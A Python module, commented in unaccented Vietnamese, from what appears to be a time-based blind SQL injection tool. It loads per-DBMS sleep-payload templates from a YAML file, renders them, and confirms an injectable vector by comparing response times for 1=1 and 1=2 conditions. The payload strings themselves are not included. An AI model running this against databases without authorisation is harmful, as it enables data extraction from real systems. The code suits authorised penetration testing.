#!/usr/bin/env python3
"""
Quan ly kho vector time-based blind (data/vectors.yaml) + logic do DBMS/vector.

Cau truc 2 tang: moi DBMS co `dialect` (manh cu phap de extract lap rap) va `vectors`
(danh sach template sleep). Xem data/vectors.yaml.

Co che do (theo DESIGN muc 7):
  - Voi moi vector, XAC NHAN bang test TRUE + FALSE:
        [INFERENCE]=1=1  -> PHAI cham (~sleeptime)
        [INFERENCE]=1=2  -> PHAI nhanh
    Chi nhan vector khi ca hai dung. Loai oracle gia (delay do loi cu phap / lag).
  - Vector dau tien vuot qua -> chot cho toan bo khai thac.
  - Tu do DBMS (--dbms auto): thu vector cua lan luot tung DBMS toi khi co cai dat.

Module KHONG tu gui request. No nhan mot callable `measure(payload) -> dt_giay` (do
transport/oracle cung cap) nen test duoc bang mock offline.
"""

from __future__ import annotations

import os
import random
import re
import string
from dataclasses import dataclass
from typing import Callable, Optional

import yaml

_REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
_DEFAULT_VECTORS = os.path.join(_REPO_ROOT, "data", "vectors.yaml")

# dieu kien hang so de xac nhan vector
COND_TRUE = "1=1"
COND_FALSE = "1=2"


class VectorError(Exception):
    pass


@dataclass
class Vector:
    """Mot vector sleep da gan DBMS + dialect cua no."""
    dbms: str
    name: str
    template: str
    note: str
    dialect: dict

    def render(self, inference: str, sleeptime: float) -> str:
        """Dung payload thuc tu template: thay [INFERENCE], [SLEEPTIME], [RANDNUM], [RANDSTR].

        [RANDNUM]/[RANDSTR] sinh moi lan render (tranh cache, dat alias duy nhat).
        """
        out = self.template
        out = out.replace("[INFERENCE]", inference)
        # sleeptime: bo .0 thua cho so nguyen (sleep(3) dep hon sleep(3.0))
        st = ("%g" % sleeptime)
        out = out.replace("[SLEEPTIME]", st)
        out = out.replace("[RANDNUM]", str(random.randint(1000, 9999)))
        out = out.replace("[RANDSTR]", _rand_str())
        return out


def _rand_str(n: int = 4) -> str:
    return "".join(random.choice(string.ascii_lowercase) for _ in range(n))


class VectorStore:
    """Nap va truy van kho vector tu YAML."""

    def __init__(self, data: dict):
        if not isinstance(data, dict) or not data:
            raise VectorError("vectors.yaml rong hoac sai dinh dang")
        self.data = data

    @classmethod
    def load(cls, path: Optional[str] = None) -> "VectorStore":
        path = path or _DEFAULT_VECTORS
        if not os.path.isfile(path):
            raise VectorError("khong tim thay file vector: %s" % path)
        with open(path, "r", encoding="utf-8") as f:
            data = yaml.safe_load(f)
        return cls(data)

    def dbms_list(self) -> list[str]:
        return list(self.data.keys())

    def dialect(self, dbms: str) -> dict:
        if dbms not in self.data:
            raise VectorError("khong co DBMS '%s' trong kho vector" % dbms)
        return self.data[dbms].get("dialect", {})

    def vectors_for(self, dbms: str) -> list[Vector]:
        if dbms not in self.data:
            raise VectorError("khong co DBMS '%s' trong kho vector" % dbms)
        block = self.data[dbms]
        dialect = block.get("dialect", {})
        result = []
        for v in block.get("vectors", []):
            result.append(Vector(
                dbms=dbms,
                name=v["name"],
                template=v["template"],
                note=v.get("note", ""),
                dialect=dialect,
            ))
        return result

    def get_vector(self, name: str) -> Vector:
        """Tim vector theo ten (cho co --vector). Duyet moi DBMS."""
        for dbms in self.dbms_list():
            for v in self.vectors_for(dbms):
                if v.name == name:
                    return v
        raise VectorError("khong tim thay vector ten '%s'" % name)


# --------------------------------------------------------------------------- do
@dataclass
class DetectResult:
    vector: Vector
    baseline: float          # do tre nen (dieu kien FALSE)
    slow: float              # do tre khi TRUE (co sleep)
    threshold: float         # nguong phan biet


def confirm_vector(vector: Vector,
                   measure: Callable[[str], float],
                   sleeptime: float,
                   margin: float = 0.5) -> Optional[DetectResult]:
    """Xac nhan mot vector bang test TRUE + FALSE.

    measure(payload) -> so giay phan hoi.
    Tra ve DetectResult neu vector hop le (TRUE cham & FALSE nhanh), None neu khong.

    Tieu chi:
      - FALSE (1=2): dt_false  ~ baseline (khong sleep)
      - TRUE  (1=1): dt_true  >= dt_false + sleeptime*margin  (co sleep)
    """
    # FALSE truoc de lay baseline
    dt_false = measure(vector.render(COND_FALSE, sleeptime))
    dt_true = measure(vector.render(COND_TRUE, sleeptime))

    # nguong: giua baseline va baseline+sleeptime
    threshold = dt_false + sleeptime * margin

    # TRUE phai vuot nguong, FALSE phai duoi nguong
    if dt_true >= threshold and dt_false < threshold:
        return DetectResult(
            vector=vector,
            baseline=dt_false,
            slow=dt_true,
            threshold=threshold,
        )
    return None


def detect_vector(store: VectorStore,
                  measure: Callable[[str], float],
                  sleeptime: float = 3.0,
                  dbms: str = "auto",
                  forced_vector: Optional[str] = None,
                  margin: float = 0.5,
                  log: Optional[Callable[[str], None]] = None) -> DetectResult:
    """Do va chot mot vector.

    - forced_vector: neu co, chi xac nhan dung vector do (cho --vector).
    - dbms='auto': thu lan luot moi DBMS. Nguoc lai chi thu DBMS chi dinh.
    - Tra ve DetectResult da chot. Raise VectorError neu khong vector nao dung.
    """
    def _log(msg):
        if log:
            log(msg)

    # Chon danh sach vector se thu
    if forced_vector:
        candidates = [store.get_vector(forced_vector)]
        _log("[vector] ep dung vector '%s'" % forced_vector)
    elif dbms == "auto":
        candidates = []
        for db in store.dbms_list():
            candidates.extend(store.vectors_for(db))
        _log("[vector] do tu dong tren %d DBMS (%d vector)"
             % (len(store.dbms_list()), len(candidates)))
    else:
        candidates = store.vectors_for(dbms)
        _log("[vector] do %d vector cua DBMS '%s'" % (len(candidates), dbms))

    for v in candidates:
        _log("[vector] thu %s/%s ..." % (v.dbms, v.name))
        res = confirm_vector(v, measure, sleeptime, margin)
        if res:
            _log("[vector] CHOT %s/%s (baseline=%.2fs, slow=%.2fs, threshold=%.2fs)"
                 % (v.dbms, v.name, res.baseline, res.slow, res.threshold))
            return res

    raise VectorError(
        "khong vector nao vuot qua xac nhan TRUE/FALSE. "
        "Kiem tra: marker dung cho? payload co bi filter? sleep co hoat dong?"
    )
